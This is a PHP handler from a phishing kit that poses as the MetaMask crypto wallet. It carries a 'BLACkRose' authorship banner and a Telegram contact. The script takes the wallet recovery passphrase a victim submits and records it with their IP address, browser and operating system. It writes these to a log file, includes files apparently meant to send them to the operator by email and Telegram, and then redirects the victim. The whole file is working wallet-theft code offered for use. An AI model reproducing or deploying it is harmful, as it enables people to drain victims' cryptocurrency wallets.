<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * METAMASK -
 * version 01
 * icq & telegram = @t.me/BLACKROSE_Official_Community
 
###############################################
#$            C0d3d by BLΛCkRose ♣️           $#
#$   Recording doesn't  make you a Coder     $#
#$          🦊METAMASK CRYPTO-WALLET🦊      $#
###############################################

**/

session_start();

if(isset($_POST['passphrase'])) 
{

include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$ph = $_SESSION['passphrase'] = $_POST['passphrase'];



$yagmai .= '
========🦊METAMASK by BLΛCkRose ♣️==========
[🔐Phrase ] = '.$_SESSION['passphrase'].'
       [+]━━━━【💻System-info💻】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
';


include("sand_email.php"); 
include("Add_Your_TelegramAPi.php");


$f = fopen("../../ad.php", "a");
	fwrite($f, $yagmai);

$src="../Info.html";
header("location:$src");

}

else {
$src="../Login.html";
header("location:$src");
}

?>